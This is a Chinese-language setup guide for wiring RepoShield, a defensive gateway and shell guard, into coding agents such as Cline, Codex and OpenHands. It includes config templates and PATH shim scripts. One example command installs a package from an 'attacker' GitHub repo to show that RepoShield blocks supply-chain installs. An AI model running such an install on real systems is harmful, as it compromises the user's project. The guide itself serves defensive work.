# Agent 接入配方：Cline / Codex / OpenHands

本文给出把 RepoShield 接入真实 agent 的可照抄配置模板。不同 agent 的 UI 和配置字段会随版本变化，下面按稳定思路写：

```text
模型请求层：agent base_url -> RepoShield Gateway
本地执行层：agent shell command -> reposhield exec-guard -> real command
```

如果只能做一件事，优先接 Gateway。  
如果 agent 会在本地直接执行 shell 命令，再加 `exec-guard`。

## 0. 准备 RepoShield

在 RepoShield 仓库中安装：

```bash
python -m pip install -e ".[test]"
```

启动 Gateway：

```bash
export OPENAI_API_KEY=sk-...

PYTHONPATH=src python -m reposhield gateway-start \
  --repo ./your-repo \
  --host 127.0.0.1 \
  --port 8765 \
  --upstream-base-url https://api.openai.com/v1
```

Windows PowerShell：

```powershell
$env:OPENAI_API_KEY="sk-..."

python -m reposhield gateway-start `
  --repo .\your-repo `
  --host 127.0.0.1 `
  --port 8765 `
  --upstream-base-url https://api.openai.com/v1
```

agent 侧统一配置：

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

## 1. Cline 接入

Cline 常见接入方式是 OpenAI-compatible API 配置。

### 模型请求层

在 Cline 的模型/API 配置中选择 OpenAI-compatible / custom provider 一类选项，然后填：

```text
Base URL: http://127.0.0.1:8765/v1
API Key:  reposhield-local
Model:    gpt-4.1
```

这样 Cline 发出的模型请求会先到 RepoShield Gateway。Gateway 会治理模型返回的 tool calls。

### 本地 shell 执行层

如果你想把 Cline 的终端命令也包起来，有两种方式。

方式 A：在提示词或自定义规则里要求所有命令都使用 `exec-guard`：

```text
When running shell commands, always use:
PYTHONPATH=<reposhield>/src python -m reposhield exec-guard --repo <repo> --task "<task>" -- <command>
```

示例：

```bash
PYTHONPATH=E:/project/reposhield_plugin_v0.3/src python -m reposhield exec-guard \
  --repo E:/project/your-repo \
  --task "修复登录按钮并运行测试" \
  -- npm test
```

方式 B：如果 Cline 所在终端支持 shell profile / PATH shim，可以把常用命令包装成 shim。见本文“PATH shim 模式”。

## 2. Codex 接入

Codex 类 agent 通常有两种接入点：模型 API 配置和 shell 工具执行。

### 模型请求层

如果你的 Codex 客户端支持 OpenAI-compatible `base_url`，配置：

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

### 本地 shell 执行层

如果 Codex 允许你设置 shell command wrapper，使用：

```bash
PYTHONPATH=<reposhield>/src python -m reposhield exec-guard \
  --repo <repo> \
  --task "<task>" \
  -- <original command>
```

如果 Codex 不支持 shell wrapper，但会继承环境变量和 `PATH`，使用 PATH shim 模式。

最小人工示例：

```bash
PYTHONPATH=E:/project/reposhield_plugin_v0.3/src python -m reposhield exec-guard \
  --repo E:/project/your-repo \
  --task "修复登录按钮并运行测试" \
  -- npm install github:attacker/helper-tool
```

预期：供应链高危命令会被阻断，不会执行真实 `npm install`。

## 3. OpenHands 接入

OpenHands 常见运行方式是容器或隔离 runtime。推荐把 RepoShield Gateway 放在宿主机或同一网络可访问的位置。

### 模型请求层

如果 OpenHands 使用 OpenAI-compatible / LiteLLM 风格配置，填：

```text
base_url = http://host.docker.internal:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

如果 OpenHands 和 RepoShield 在同一个容器网络里，把 `host.docker.internal` 换成 RepoShield 服务名或宿主 IP。

### 本地 shell 执行层

如果 OpenHands runtime 允许自定义环境变量和 PATH，可以把 shim 目录放到 PATH 最前：

```bash
export REPOSHIELD_HOME=/workspace/reposhield_plugin_v0.3
export REPOSHIELD_REPO=/workspace/your-repo
export REPOSHIELD_TASK="修复登录按钮并运行测试"
export PATH="$REPOSHIELD_REPO/.reposhield/shims:$PATH"
```

然后 shim 里的 `npm` / `git` / `curl` 等命令会先走 RepoShield。

## 4. PATH shim 模式

这是最通用的真实 agent shell 接入方式：创建一组同名脚本，把危险命令入口包到 `exec-guard`，再把 shim 目录放到 PATH 最前。

目录：

```text
your-repo/
  .reposhield/
    shims/
      npm
      git
      curl
      python
```

Linux/macOS shim 示例，保存为 `.reposhield/shims/npm`：

```bash
#!/usr/bin/env bash
set -euo pipefail

REAL_NPM="$(command -v npm.real || true)"
if [ -z "$REAL_NPM" ]; then
  REAL_NPM="/usr/bin/npm"
fi

PYTHONPATH="${REPOSHIELD_HOME}/src" python -m reposhield exec-guard \
  --repo "${REPOSHIELD_REPO:-$PWD}" \
  --task "${REPOSHIELD_TASK:-general coding task}" \
  -- "$REAL_NPM" "$@"
```

注意：如果你把真实命令写成 `/usr/bin/npm`，ActionParser 看到的是 `/usr/bin/npm install ...`，仍能识别 `npm install`。如果真实路径不固定，建议在 shim 中保存真实命令路径，避免递归调用自己。

Windows PowerShell shim 示例，保存为 `.reposhield/shims/npm.ps1`：

```powershell
$repo = if ($env:REPOSHIELD_REPO) { $env:REPOSHIELD_REPO } else { (Get-Location).Path }
$task = if ($env:REPOSHIELD_TASK) { $env:REPOSHIELD_TASK } else { "general coding task" }
$rs = if ($env:REPOSHIELD_HOME) { $env:REPOSHIELD_HOME } else { "E:\project\reposhield_plugin_v0.3" }

$env:PYTHONPATH = Join-Path $rs "src"
python -m reposhield exec-guard --repo $repo --task $task -- npm @args
exit $LASTEXITCODE
```

把 shim 目录放到 PATH 最前：

```powershell
$env:REPOSHIELD_HOME="E:\project\reposhield_plugin_v0.3"
$env:REPOSHIELD_REPO="E:\project\your-repo"
$env:REPOSHIELD_TASK="修复登录按钮并运行测试"
$env:PATH="$env:REPOSHIELD_REPO\.reposhield\shims;$env:PATH"
```

## 5. 推荐组合

最实用组合：

```text
Gateway base_url 接入
  + exec-guard/PATH shim 包住 shell
  + RepoShield audit log
```

这样可以同时覆盖：

```text
模型返回的 tool_calls
agent 本地直接执行的 shell 命令
供应链安装
密钥读取
网络外发
CI / publish / force push 等高危动作
```

## 6. 当前限制

- Cline / Codex / OpenHands 的具体配置字段可能随版本变化，本文给的是稳定接入模式。
- PATH shim 需要小心递归调用。真实命令路径最好固定或单独保存。
- `exec-guard` 目前主要守卫 shell 命令；文件编辑类工具还需要 agent 专用 adapter 或 filesystem-level guard。
- `allow_in_sandbox` 当前只做 sandbox preflight，不直接在宿主机执行。

